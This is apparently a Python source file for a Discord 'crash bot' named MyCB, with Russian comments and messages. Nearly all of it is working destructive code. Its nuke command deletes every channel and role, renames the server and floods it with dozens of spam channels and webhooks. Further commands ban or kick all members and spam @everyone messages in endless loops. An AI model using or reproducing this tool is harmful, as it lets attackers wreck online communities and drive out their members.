# -*- coding: utf-8 -*-

# mycb это make-your-crash-bot если что
try:
    # импорты
    from colorama import init
    from colorama import Fore, Back, Style
    from colorama import Fore
    init()
    import discord
    from discord import *
    from discord.ext import commands
    import asyncio
    import time
    import colorama
    init()
except:
    os.system("pip install colorama")
    os.system("pip install discord")
    os.system("pip install asyncio")


# основное
print(Fore.RED)
prefix = input(f'Префикс для бота - ')
print(Fore.BLUE)
token = input(f'Токен бота - ')

# подробные настройки
channelsn = 'crash-by-mycb'
rolesn = 'Crash By MyCB'
namen = 'Crashed By MyCB'
iconn = 'icon.PNG'
hooknamen = 'Crashed By MyCB'
botnamen = 'MyCB'
inviten = 'https://discord.gg/vxZz92YCSX' # тут ссылка на ваш сервер
spamtextn = f'@everyone\nДанный сервер крашиться ботом MyCB\nСервер поддержки: {inviten}'
botownern = 873587098752540772 # тут укажи твой id
reasonn = 'Crash by MyCB' # причина удаления ролей,каналов, бана и кика участников

# включаем интенты и создаем переменную бота (client)
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help') # удаляем встроенную команду хелпа

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name=f'Краш-бот {botnamen}'))
    print(f'{Fore.BLUE}Краш бот {botnamen} запущен! Для получения списка команд добавьте бота на сервер и пропишите {prefix}help')

@client.command()
async def help(ctx, arg=''):
    if arg == 'crash':
        embed = discord.Embed(
            title = 'Краш-команды',
            description = f'`{prefix}nuke` - авто краш сервера\n`{prefix}delchannels` - удалить все каналы на сервере\n`{prefix}delroles` - удалить все роли на сервере\n`{prefix}createchannels (кол-во)` - создает определенное кол-во каналов\n`{prefix}createroles (кол-во)` - создает определенное кол-во ролей\n`{prefix}spamwebhooks` - спам вебхуками во все каналы\n`{prefix}spamwebhook1` - спам вебхуком в текущий канал\n`{prefix}rename` - изменить иконку и установить имя серверу (имя иконки - `{iconn}`, имя крашнутого сервера - `{namen}`)\n`{prefix}banall` - бан всех участников сервера\n`{prefix}kickall` - кикнуть всех участников сервера\n`{prefix}spamallchannels` - спам во все каналы от лица бота\n`{prefix}spam` - спам в текущий канал\n**Ну а что вы больше ждали от бесплатного бота?**',
            colour = discord.Colour.from_rgb(237, 47, 47)
        )

        await ctx.send(embed=embed)
        return
    elif arg == 'status':
        embed = discord.Embed(
            title = 'Команды статуса',
            description = f'`{prefix}status stream Первый стрим` - установить статус "Стримит" с вашим названием стрима\n`{prefix}status watching (имя стрима)` - установить статус "Смотрит"\n`{prefix}status listening Песня` - установить статус "Слушает"\n`{prefix}status playing Ебу сервера` - установить статус "играет"',
            colour = discord.Colour.from_rgb(237, 47, 47)
        )

        await ctx.send(embed=embed)
        return



    embed = discord.Embed(
        title = 'Список команд',
        description = f'`{prefix}help crash` - помощь по разделу "Краш команды"\n`{prefix}help status` - помощь по разделу "Команды статуса"',
        colour = discord.Colour.from_rgb(237, 47, 47)
    )

    await ctx.send(embed=embed)

@client.command()
async def status(ctx, arg='', *, names=''):
  if int(ctx.author.id) == botownern:
    bll = [''] # не смейтесь ебать, просто not == '' не работало, а искать решение лень
    if arg == 'stream' and names not in bll:
        await client.change_presence(activity=discord.Streaming(name=names, url='https://twitch.tv/404'))
        await ctx.message.add_reaction('✅')
    elif arg == 'watching' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'listening' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'playing' and names not in bll:
        await client.change_presence(activity=discord.Game(name=names))
        await ctx.message.add_reaction('✅')
    else:
        embed = discord.Embed(
            title = 'Ошибка ❌',
            description = f'Вы не указали статус или имя для него, либо указали неверный тип статуса\nВведите `{prefix}help status` для получения информации о данной команде',
            colour = discord.Colour.from_rgb(29, 224, 11)
        )
        await ctx.send(embed=embed)
  else:
    await ctx.send('Недостаточно прав!')

@client.command()
async def nuke(ctx):
    timer = time.time()
    nameold = ctx.guild.name
    try:        
        msg = await ctx.author.send(f'Начинаю краш сервера {ctx.guild.name}...')
    except:
        print(f'Не могу отправить сообщение в лс юзеру {ctx.author.name}, краш остановлен. Открой лс или разблокируй бота чтобы все работало корректно!')
        return
    try:
        with open(iconn, 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(name=namen, icon=icon)
    except:
        print(f'Не могу изменить имя и иконку серверу "{ctx.guild.name}", продолжаю краш сервера')

    for channell in ctx.guild.channels:
        try:
            await channell.delete(reason=reasonn)
        except:
            print(f'Не смог удалить канал {channell.name} на сервере {nameold} , продолжаю краш сервера...')

    await msg.edit(content=f'Краш сервера {nameold} (ID - `{ctx.guild.id}`):\nКаналы удалены, сейчас удаляю роли')

    for roleee in ctx.guild.roles:
        try:
            await roleee.delete(reason=reasonn)
        except:
            print(f'Не могу удалить роль {roleee.name} на сервере {nameold}, продолжаю краш')

    await msg.edit(content=f'Краш сервера {nameold} (ID - `{ctx.guild.id}`):\nКаналы и роли удалены, создаю каналы и роли, в каналы спамлю вебхуками')

    for i in range(45):
        try:
            chh = await ctx.guild.create_text_channel(channelsn)
            await chh.create_webhook(name=hooknamen)
            await ctx.guild.create_role(name=rolesn)
        except:
            print(f'Не могу создать канал и роль на сервере {nameold}, продолжаю краш')

    newtimer = int(time.time()) - int(timer)
    await msg.edit(content=f'Краш сервера {nameold} (ID - `{ctx.guild.id}`):\nКаналы и роли удалены, созданы каналы и роли и насппамлены вебхуки\nКраш сервера был выполнен за {newtimer} секунд.')

@client.command()
async def delchannels(ctx):
    count = 0
    for channel in ctx.guild.voice_channels:
        try:
            await channel.delete(reason=reasonn)
            count+=1
        except:
            pass

    for channel in ctx.guild.text_channels:
        try:
            await channel.delete(reason=reasonn)
            count+=1
        except:
            pass

    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason=reasonn)
            count+=1
        except:
            pass

    await ctx.author.send(f'Удалил {count} каналов')

# для шарющих, просто впервые пробую такую схему, и это не "говнокод" или не "накрутка строк кода"

@client.command()
async def delroles(ctx):
    count = 0
    for channel in ctx.guild.roles:
        try:
            await channel.delete(reason=reasonn)
            count+=1
        except:
            pass

    await ctx.author.send(f'Удалил {count} ролей')

@client.command()
async def createchannels(ctx, count):
    for i in range(int(count)):
        await ctx.guild.create_text_channel(channelsn)

@client.command()
async def createroles(ctx, count):
    for i in range(int(count)):
        await ctx.guild.create_role(name=rolesn)

@client.command()
async def spamwebhooks(ctx):
    for channel in ctx.guild.text_channels:
        try:
            await channel.create_webhook(name=hooknamen)
        except:
            print(f'Не создал хук на канал {channel.name}')

    for i in range(100):
        for ch in ctx.guild.text_channels:
            hooklist = await ch.webhooks()
            for hook in hooklist:
                for i in range(1):
                    await hook.send(content=spamtextn, wait=True)

@client.command()
async def spamwebhook1(ctx):
            await ctx.message.channel.create_webhook(name=hooknamen)
            await ctx.message.channel.create_webhook(name=hooknamen)
            await ctx.message.channel.create_webhook(name=hooknamen)
            hooklist = await ctx.message.channel.webhooks()
            for hook in hooklist:
                for i in range(100):
                    await hook.send(content=spamtextn, wait=True)

@client.command()
async def rename(ctx):
    try:
        with open(iconn, 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(name=namen, icon=icon)
    except:
        print(f'Не могу изменить имя и иконку серверу "{ctx.guild.name}"')

@client.command()
async def banall(ctx):
    count = 0
    for jktimosha in ctx.guild.members:
        if int(jktimosha.id) != int(ctx.message.author.id):
            try:
                await ctx.guild.ban(jktimosha, reason=reasonn)
                count+=1
            except:
                print(f'Не забанил участника {jktimosha.name}')

    await ctx.author.send(f'Забанил {count} человек')

@client.command()
async def kickall(ctx):
    count = 0
    for jktimosha in ctx.guild.members:
        if int(jktimosha.id) != int(ctx.message.author.id):
            try:
                await ctx.guild.kick(jktimosha, reason=reasonn)
                count+=1
            except:
                print(f'Не кикнул участника {jktimosha.name}')


    await ctx.author.send(f'Кикнул {count} человек')

@client.command()
async def spamallchannels(ctx):
    for channel in ctx.guild.text_channels: # если бы не тимоша этого бы не было (или бы было)
        try:
            await channel.send(spamtextn)
        except:
            print(f'Не отправил спам в {channel.name}')

@client.command()
async def spam(ctx):
    while True:
        await ctx.send(spamtextn)

@client.event
async def on_guild_channel_create(channel):
            try:
                await channel.send(spamtextn)
                await channel.send(spamtextn)
                await channel.send(spamtextn)
                hooklist = await channel.webhooks()
                for hook in hooklist:
                    for i in range(97):
                        await hook.send(content=spamtextn, wait=True)
            except:
                print(f'Не получилось заспамить вебхуком в каком-то канале (возможно, этот канал был создан не ботом и это вызвало ошибку)')

try:
	client.run(token)
except Exception as e:
	print('Ты указал неверный токен бота или не включил ему интенты!')
	input()
